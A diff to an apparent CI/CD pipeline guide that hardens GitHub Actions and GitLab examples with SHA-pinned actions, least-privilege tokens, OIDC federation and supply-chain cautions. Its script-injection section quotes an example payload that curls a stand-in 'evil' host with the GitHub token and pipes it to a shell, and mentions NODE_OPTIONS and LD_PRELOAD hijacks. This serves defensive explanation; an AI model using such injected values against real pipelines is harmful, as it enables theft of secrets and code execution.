@@ -183,9 +183,10 @@ This skill covers the complete lifecycle of CI/CD pipeline design, implementatio
 1. **Shift Left**: Run security scans early in the pipeline
 2. **Dependency Scanning**: Check for CVEs in all dependencies
 3. **Secrets Management**: Never hardcode secrets, use secure vaults
-4. **Least Privilege**: Minimal permissions for pipeline runners
-5. **Supply Chain Security**: Verify and sign artifacts
-6. **Audit Trail**: Log all deployments and access
+4. **Least Privilege**: In GitHub Actions set `permissions: {}` at workflow level to deny all GITHUB_TOKEN scopes, then grant only what each job needs (`packages: write` for build/push, `security-events: write` for CodeQL, `id-token: write` + `attestations: write` for attestation). Setting any one scope forces all others to `none`. The GITHUB_TOKEN default is read-only only for orgs/repos created after Feb 2023 — older repos keep the permissive read-write default, so an absent block is dangerous. For cloud access, use OIDC federation, not stored long-lived credentials.
+5. **Pin Actions to SHAs**: Reference third-party actions by full 40-char commit SHA (`uses: owner/action@<sha>  # vX.Y.Z`), never a mutable tag or `@main`/`@master`. Automate updates with Dependabot/Renovate (`package-ecosystem: github-actions`).
+6. **Supply Chain Security**: Verify and sign artifacts; generate SLSA provenance/SBOM attestations and promote artifacts by immutable digest.
+7. **Audit Trail**: Log all deployments and access
 
 ### Performance
 
@@ -266,8 +267,9 @@ jobs:
           DATABASE_URL: postgresql://postgres:postgres@localhost:5432/test
 
       - name: Upload coverage
-        uses: codecov/codecov-action@v3
+        uses: codecov/codecov-action@<full-sha>  # v5 — pin to SHA
         with:
+          token: ${{ secrets.CODECOV_TOKEN }}  # required for non-fork uploads since v4
           files: ./coverage/lcov.info
 
   build:
@@ -302,12 +304,15 @@ jobs:
             type=raw,value=latest,enable=${{ github.ref == 'refs/heads/main' }}
 
       - name: Build and push
-        uses: docker/build-push-action@v5
+        id: build
+        uses: docker/build-push-action@<full-sha>  # v6 — pin to SHA
         with:
           context: .
           push: true
           tags: ${{ steps.meta.outputs.tags }}
           labels: ${{ steps.meta.outputs.labels }}
+          provenance: mode=max  # SLSA provenance (private repos default to mode=min)
+          sbom: true            # not automatic — opt in (incompatible with load: true)
           cache-from: type=gha
           cache-to: type=gha,mode=max
 
@@ -457,25 +462,38 @@ on:
       image-tag:
         required: true
         type: string
-    secrets:
-      KUBE_CONFIG:
+      cluster-name:
         required: true
+        type: string
+      aws-region:
+        required: true
+        type: string
 
 jobs:
   deploy:
     runs-on: ubuntu-latest
     environment: ${{ inputs.environment }}
+    permissions:
+      id-token: write  # REQUIRED for OIDC federation
+      contents: read
 
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@<full-sha>  # v4 — pin to SHA
 
       - name: Set up kubectl
-        uses: azure/setup-kubectl@v3
+        uses: azure/setup-kubectl@<full-sha>  # v4 — pin to SHA
 
-      - name: Configure kubeconfig
-        run: |
-          mkdir -p ~/.kube
-          echo "${{ secrets.KUBE_CONFIG }}" | base64 -d > ~/.kube/config
+      # Prefer OIDC over a long-lived base64 KUBE_CONFIG secret: mint short-lived
+      # cloud creds, then derive a kubeconfig. (GCP: gcloud + gke-gcloud-auth-plugin;
+      # Azure: az aks get-credentials.)
+      - name: Configure AWS credentials (OIDC)
+        uses: aws-actions/configure-aws-credentials@<full-sha>  # v4 — pin to SHA
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
+          aws-region: ${{ inputs.aws-region }}
+
+      - name: Update kubeconfig (short-lived cluster creds)
+        run: aws eks update-kubeconfig --name ${{ inputs.cluster-name }} --region ${{ inputs.aws-region }}
 
       - name: Deploy
         run: |
@@ -528,8 +546,10 @@ jobs:
       - name: Perform CodeQL Analysis
         uses: github/codeql-action/analyze@v3
 
-      - name: SonarCloud Scan
-        uses: SonarSource/sonarcloud-github-action@master
+      - name: SonarQube Scan
+        # sonarcloud-github-action is deprecated (repo archived 2025-10-22);
+        # sonarqube-scan-action is the drop-in replacement. Pin to a full SHA.
+        uses: SonarSource/sonarqube-scan-action@<full-sha>  # vX.Y.Z
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
@@ -547,7 +567,7 @@ jobs:
       - uses: actions/checkout@v4
 
       - name: Run Trivy vulnerability scanner
-        uses: aquasecurity/trivy-action@master
+        uses: aquasecurity/trivy-action@<full-sha>  # v0.24.0 — pin to SHA, never @master
         with:
           scan-type: "fs"
           scan-ref: "."
@@ -561,7 +581,7 @@ jobs:
           sarif_file: "trivy-results.sarif"
 
       - name: Snyk Security Scan
-        uses: snyk/actions/node@master
+        uses: snyk/actions/node@<full-sha>  # vX.Y.Z — pin to SHA, never @master
         env:
           SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
         with:
@@ -577,14 +597,14 @@ jobs:
           fetch-depth: 0 # Full history for secret detection
 
       - name: TruffleHog Scan
-        uses: trufflesecurity/trufflehog@main
+        uses: trufflesecurity/trufflehog@<full-sha>  # vX.Y.Z — pin to SHA, never @main
         with:
           path: ./
           base: ${{ github.event.repository.default_branch }}
           head: HEAD
 
       - name: GitGuardian Scan
-        uses: GitGuardian/ggshield-action@v1
+        uses: GitGuardian/ggshield-action@<full-sha>  # v1.x — pin to SHA, tags are mutable
         env:
           GITHUB_PUSH_BEFORE_SHA: ${{ github.event.before }}
           GITHUB_PUSH_BASE_SHA: ${{ github.event.base }}
@@ -603,14 +623,14 @@ jobs:
         run: docker build -t myapp:${{ github.sha }} .
 
       - name: Scan image with Trivy
-        uses: aquasecurity/trivy-action@master
+        uses: aquasecurity/trivy-action@<full-sha>  # v0.24.0 — pin to SHA, never @master
         with:
           image-ref: "myapp:${{ github.sha }}"
           format: "sarif"
           output: "trivy-image-results.sarif"
 
       - name: Scan image with Grype
-        uses: anchore/scan-action@v3
+        uses: anchore/scan-action@<full-sha>  # vX.Y.Z — pin to SHA
         with:
           image: "myapp:${{ github.sha }}"
           fail-build: true
@@ -649,8 +669,9 @@ jobs:
         run: npm run test:unit -- --coverage --maxWorkers=4
 
       - name: Upload coverage
-        uses: codecov/codecov-action@v3
+        uses: codecov/codecov-action@<full-sha>  # v5 — pin to SHA
         with:
+          token: ${{ secrets.CODECOV_TOKEN }}  # required for non-fork uploads since v4
           files: ./coverage/coverage-final.json
           flags: unit-${{ matrix.os }}-node${{ matrix.node-version }}
 
@@ -899,21 +920,25 @@ jobs:
     needs: evaluate-model
     if: github.ref == 'refs/heads/main'
     environment: production
+    permissions:
+      id-token: write  # REQUIRED for OIDC — omitting silently breaks the token request
+      contents: read
 
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@<full-sha>  # v4 — pin to SHA
 
       - name: Download model
-        uses: actions/download-artifact@v4
+        uses: actions/download-artifact@<full-sha>  # v4 — pin to SHA
         with:
           name: trained-model
           path: models/output/
 
-      - name: Configure AWS credentials
-        uses: aws-actions/configure-aws-credentials@v4
+      - name: Configure AWS credentials (OIDC, no stored keys)
+        uses: aws-actions/configure-aws-credentials@<full-sha>  # v4 — pin to SHA
         with:
-          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
-          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+          # Short-lived STS creds via OIDC — no long-lived access keys as secrets.
+          # Trust policy: StringEquals sub = repo:org/repo:environment:production
+          role-to-assume: arn:aws:iam::123456789012:role/github-actions-ml-deploy
           aws-region: us-east-1
 
       - name: Upload model to S3
@@ -1211,15 +1236,15 @@ jobs:
         uses: docker/setup-buildx-action@v3
 
       - name: Build with cache
-        uses: docker/build-push-action@v5
+        uses: docker/build-push-action@<full-sha>  # v6 — pin to SHA
         with:
           context: .
           push: false
           tags: myapp:${{ github.sha }}
           cache-from: type=gha
           cache-to: type=gha,mode=max
-          build-args: |
-            BUILDKIT_INLINE_CACHE=1
+          # NOTE: do NOT add BUILDKIT_INLINE_CACHE=1 here — that build-arg drives the
+          # REGISTRY inline-cache mechanism and is silently ignored by the type=gha backend.
 ```
 
 ## Pipeline Optimization Patterns
@@ -1291,4 +1316,135 @@ kubectl apply --dry-run=client -f k8s/
 
 # Validate workflow syntax
 actionlint .github/workflows/*.yml
+```
+
+## Expert Practices: Idioms, Anti-Patterns & Gotchas
+
+High-signal practices distilled from official platform docs and supply-chain incident research. Each carries the mechanism — the *why* is what makes the rule transfer to new situations.
+
+### Security
+
+**Pin third-party actions to a full commit SHA, never a tag or branch.** `uses: owner/action@v4` and `@main`/`@master` are mutable git refs: the maintainer (or an attacker who compromises the repo or a PAT) can force-push the tag/branch to different code, and every consumer silently runs it on the next trigger. This is the exact mechanism of tj-actions/changed-files (CVE-2025-30066, March 2025) — tags repointed to a single malicious commit that dumped runner memory (secrets) into logs across 23,000+ repos; trivy-action was hit similarly. A 40-char SHA is content-addressed (Git addresses objects by SHA-1 of their content) so it resolves to exactly one tree of bytes forever; a tag is just a named pointer with no such guarantee. `@main`/`@master` is the worst case — it advances on every push. Pair SHA pins with Dependabot/Renovate so you still get update PRs.
+
+```yaml
+- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
+- uses: aquasecurity/trivy-action@6e7b7d1fd3e4fef0c5fa8cce1229c54b2c9bd0d8  # v0.24.0
+# .github/dependabot.yml: { package-ecosystem: github-actions, directory: /, schedule: { interval: weekly } }
+```
+
+**Declare `permissions: {}` at workflow level, then grant per-job minimums.** A workflow with no `permissions` block inherits the repo default — read-only only for orgs/repos created after Feb 2023; older repos and many forks keep the permissive read-write default. Setting `{}` denies all GITHUB_TOKEN scopes; then, because **setting any one scope forces all unspecified scopes to `none`**, granting one scope per job locks the rest down. This bounds blast radius: a compromised action in a test job with no write scopes cannot push commits, alter workflows, or exfiltrate via the Actions API.
+
+```yaml
+permissions: {}   # deny all by default
+jobs:
+  test:
+    steps: [ ... ]          # inherits empty set
+  build:
+    permissions: { contents: read, packages: write }   # only this job can push to GHCR
+    steps: [ ... ]
+```
+
+**Replace long-lived cloud keys with OIDC, scoped to repo + ref/environment.** Stored AWS/GCP/Azure keys never expire and can't be scoped to a branch; they leak via logs, secret scanning, or insiders. OIDC mints a short-lived signed JWT per job (claims: subject, repo, ref, environment) that the cloud IAM trust policy verifies before returning temporary STS creds. The critical footgun is an over-broad trust policy: a `sub` of `repo:org/*` (or `StringLike`, or no `sub` check at all) lets any repo/branch — including a fork PR — assume the role. Scope `sub` with `StringEquals` to the exact ref/environment, e.g. `repo:org/repo:environment:production`. On GitHub the job needs `permissions: id-token: write` — omitting it makes the token request silently return empty and the action fails cryptically. On **GitLab (≥15.7)** use the `id_tokens` keyword with `aud`; `CI_JOB_JWT`/`CI_JOB_JWT_V2` were **removed in GitLab 17.0 (May 2024)** — pipelines relying on them break.
+
+```yaml
+# GitLab CI — OIDC, no stored keys (CI_JOB_JWT was removed in 17.0)
+deploy:
+  id_tokens:
+    AWS_OIDC_TOKEN: { aud: https://sts.amazonaws.com }
+  script:
+    - aws sts assume-role-with-web-identity --role-arn "$ROLE_ARN"
+        --web-identity-token "$AWS_OIDC_TOKEN" --role-session-name gitlab-$CI_JOB_ID
+```
+
+**Never use `pull_request_target` while checking out fork code — use the two-workflow split.** `pull_request_target` runs in the BASE repo context with a write-scoped token and full secret visibility, even for fork PRs. Adding `actions/checkout` with `ref: github.event.pull_request.head.sha` to "test the PR" materializes attacker code inside that privileged context, so any subsequent `npm install`/`make` runs attacker-controlled postinstall hooks with the write token and secrets in memory (a "pwn request" / Poisoned Pipeline Execution). The durable fix is a hard split: Workflow 1 (`on: pull_request`, `permissions: {}`) runs the untrusted code and uploads results as an artifact; Workflow 2 (`on: workflow_run`, has secrets/write) downloads that artifact and treats its contents as **untrusted data** — never executing it or writing it to `GITHUB_ENV`. (actions/checkout@v7, GA June 2026, refuses fork-PR checkout under `pull_request_target` by default, but the split is the durable mitigation.)
+
+**Route untrusted context values through env vars to prevent script injection.** `${{ expression }}` is evaluated at workflow-*generation* time, BEFORE the shell parses `run:` — so the value is string-substituted into the script source. A user-controlled field (PR title, branch name, commit message) interpolated inline lets an attacker supply `a"; curl evil/$GITHUB_TOKEN | sh; echo "` which then executes. Assign the expression to an `env:` var and reference `"$VAR"`: the value lands in memory as a string before generation, and the shell resolves the variable *after* parsing, so metacharacters stay data. GitHub Security Lab treats any field ending in body/title/message/name/ref/label/head_ref/email/default_branch/page_name as untrusted.
+
+```yaml
+- name: Check PR title
+  env:
+    PR_TITLE: ${{ github.event.pull_request.title }}  # resolved before shell parses
+  run: |
+    [[ "$PR_TITLE" =~ ^feat ]] && echo "feature PR"
+```
+
+**Treat `GITHUB_ENV`/`GITHUB_PATH` writes of untrusted data as privilege escalation.** Distinct from script injection: here the command is safe but the DATA written is attacker-controlled. `GITHUB_ENV` sets env vars for all later steps, so piping untrusted content (a fork's `workflow_run` artifact, an API response) into it lets an attacker inject `NODE_OPTIONS=--require /evil` or `LD_PRELOAD`, hijacking subsequent steps; appending to `GITHUB_PATH` prepends malicious dirs for tool substitution; and a line matching `VAR<<DELIM ... DELIM` defines arbitrary vars via heredoc. Prefer `GITHUB_OUTPUT` (named key=value pairs only, no effect on the running shell's env) for passing values; validate/strip newlines; use a randomized heredoc delimiter (`EOF$(uuidgen)`) for legitimate multiline values.
+
+**Secret log redaction is best-effort — register derived values explicitly.** Redaction matches EXACT registered secret values in stdout/stderr. It misses: (1) structured secrets — a JSON blob stored as one secret is matched only as the whole string, not an embedded token printed alone; (2) derived values — base64/JWT/concatenations are new, unregistered strings; (3) some tool stderr that bypasses the masking pipeline. Store decomposed scalar secrets, not blobs; call `echo "::add-mask::$DERIVED"` *before* emitting any output for values you derive; audit raw logs after testing with sensitive inputs. Redaction is a backstop, not a control.
+
+**GitHub Actions cache crosses trust boundaries — don't restore caches in publish/release jobs.** The cache key namespace is shared across branches and is NOT isolated by privilege level, so a low-privilege `pull_request` workflow can write an entry that a high-privilege release job later restores (cache poisoning) — backdooring the published artifact, even one that then gets a valid SLSA attestation. In publish/release jobs, do NOT restore caches; reinstall fresh from the lock file (`npm ci`) so integrity is re-verified.
+
+**Use ephemeral self-hosted runners; avoid self-hosted runners on public repos.** Persistent runners retain workspace files, env vars, and cached credentials between jobs — a later job (including a fork PR job on a public repo) can read and exfiltrate them. GitHub's guidance: no self-hosted runners on public repos; for private/internal use just-in-time (`--ephemeral`) runners provisioned per job and destroyed after one use (via the registration API or Actions Runner Controller `ephemeral: true`).
+
+### Idioms
+
+**Generate SLSA provenance for release artifacts — but know its limits.** `actions/attest-build-provenance` (GA June 2024) uses Sigstore to bind an artifact's digest to the workflow run, repo, commit, and trigger, reaching SLSA Build L2 out of the box; consumers verify with `gh attestation verify`. Required: `id-token: write` (mint the Sigstore cert) and `attestations: write` (persist it) — missing either fails, often only surfacing at verification. **Crucial nuance:** provenance attests build *identity*, not input *cleanliness* — it signs whatever the workflow produced, including an artifact built from a poisoned cache. Pair it with lock-file install (`npm ci`), no cache restore in the publish job, and SHA-pinned actions. Prefer `actions/attest-build-provenance` over the older generic `actions/attest`.
+
+**Add SBOM and explicit provenance to Docker images with build-push-action v6+; never pass secrets via `--build-arg`.** Since v4, provenance attestations are added automatically (public repos `mode=max`, private `mode=min`); SBOM is NOT automatic — set `sbom: true`. Both require pushing to a registry and are incompatible with `load: true`. Security gotcha: build args appear in `mode=max` provenance on public repos, so pass secrets via BuildKit secret mounts (`secrets:`), never `build-args`. Current major is v6 (v7 available 2026); pin to a SHA regardless.
+
+```yaml
+- uses: docker/build-push-action@<sha>  # v6
+  with:
+    context: .
+    push: true
+    provenance: mode=max
+    sbom: true
+    secrets: |
+      MY_SECRET=${{ secrets.MY_SECRET }}   # secret mount, NOT --build-arg
+```
+
+**Lint workflows with actionlint and zizmor in CI.** Generic YAML linters can't see Actions semantics. `actionlint` type-checks workflow expressions, validates action inputs, and runs ShellCheck on `run:` scripts. `zizmor` flags supply-chain risks (unpinned third-party refs), over-broad `permissions`, and expression injection (it excludes official GitHub actions from its pinning rule to cut false positives). Run both as a CI step or pre-commit — cheap, high-leverage, complementary to SHA-pinning and least-privilege.
+
+### Design Patterns
+
+**Build artifacts once and promote the same bytes by digest; never rebuild per environment.** Rebuilding a container/binary separately for staging and prod is non-deterministic — base-image digests, transitive deps, and compiler output can differ between builds of the same source SHA, so what you validated in staging is not what reaches prod. The "Continuous Delivery" (Humble & Farley) immutable-artifact principle: build once, capture the content-addressed digest, promote that exact digest. A registry tag (`v1.2.3`) is a mutable pointer; a digest (`sha256:...`) is immutable. SLSA provenance binds to the digest, so promoting by digest preserves the chain of custody.
+
+```yaml
+- name: Deploy by immutable digest (not the tag)
+  run: kubectl set image deployment/app app=ghcr.io/org/app@${{ steps.build.outputs.digest }}
+```
+
+**Trunk-based development is a prerequisite for true CI, not a naming convention.** DORA/Accelerate research found trunk-based development (integrating to mainline daily via short-lived branches) is a statistically significant predictor of elite delivery. A pipeline validating an isolated long-lived branch only catches integration failures at merge time, not continuously — so CI in the Humble/Farley sense requires every developer's code to reach mainline at least daily. Implications: optimize the trunk gate for fast feedback (target sub-5-minute fast checks) and use feature flags to decouple deploy from release so incomplete features can merge to trunk unseen. Running CI primarily on a long-lived `develop` branch does not achieve CI.
+
+### Gotchas
+
+**Concurrency: cancel-in-progress for CI, `false` for deployments.** `cancel-in-progress: true` is correct for lint/test (aborting a stale run wastes nothing). On DEPLOYMENT jobs it's dangerous — cancelling a mid-flight rollout (a 50%-complete Kubernetes rollout, a half-applied migration) leaves mismatched versions or partial state. Use the same group key with `cancel-in-progress: false` so deploys queue. Two nuances: (1) with `false`, a group holds at most one running + one pending — a third trigger cancels the PENDING job, never the running one; (2) include `github.workflow` in the group key so an unprefixed ref-based key doesn't cancel unrelated workflows.
+
+```yaml
+# CI
+concurrency: { group: "ci-${{ github.workflow }}-${{ github.head_ref || github.ref }}", cancel-in-progress: true }
+# Deploy — queue, never interrupt a live rollout
+concurrency: { group: "deploy-${{ github.workflow }}-production", cancel-in-progress: false }
+```
+
+**GitLab CI: use `rules:` + `workflow:rules`, never mix with `only/except`; suppress duplicate pipelines.** (1) Mixing `only/except` and `rules:` across jobs in one pipeline is unsupported — GitLab processes them separately, producing unpredictable job inclusion; migrate everything to `rules:`. (2) When a job has both an MR-event rule and a branch rule, a push to a branch with an open MR triggers BOTH a detached merge-request pipeline and a branch pipeline — doubling runner load. The canonical fix is a global `workflow:rules` that suppresses the branch pipeline when an MR is open, keyed on `$CI_OPEN_MERGE_REQUESTS`.
+
+```yaml
+workflow:
+  rules:
+    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
+    - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS
+      when: never                                   # suppress duplicate branch pipeline
+    - if: $CI_COMMIT_BRANCH
+```
+
+**GitHub Actions cache key: scope by `runner.os`, key on the lock file, keep restore-keys narrow.** (1) Omitting `runner.os` lets Linux and macOS share a cache — native/compiled binaries built for one OS fail on the other. (2) Keying on source (`hashFiles('**/*.ts')`) misses the cache on every code change; key on the dependency LOCK file (`package-lock.json`, `Cargo.lock`), which changes only when deps change. (3) `restore-keys` are prefix-matched by recency, so a too-broad fallback can restore an arbitrary stale/incompatible cache — keep the prefix specific.
+
+```yaml
+- uses: actions/cache@v4
+  with:
+    path: ~/.npm
+    key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
+    restore-keys: |
+      ${{ runner.os }}-npm-
+```
+
+**`type=gha` Docker cache requires Buildx and silently no-ops otherwise.** The `type=gha` BuildKit backend is NOT supported by the default `docker` driver on GitHub-hosted runners — it needs a `docker-container`/`docker-buildx` builder. Without `docker/setup-buildx-action` before `docker/build-push-action`, `cache-from`/`cache-to: type=gha` are silently ignored: zero read, zero write, no error. Also: `BUILDKIT_INLINE_CACHE=1` is a build-arg for the *registry* inline-cache mechanism — it has no effect with `type=gha` and just adds confusion; and multiple image builds in one job sharing the default scope overwrite each other's cache, so give each a distinct `scope=`.
+
+```yaml
+- uses: docker/setup-buildx-action@<sha>   # REQUIRED before the gha backend
+- uses: docker/build-push-action@<sha>     # v6
+  with:
+    cache-from: type=gha,scope=api
+    cache-to: type=gha,mode=max,scope=api   # distinct scope per image
 ```
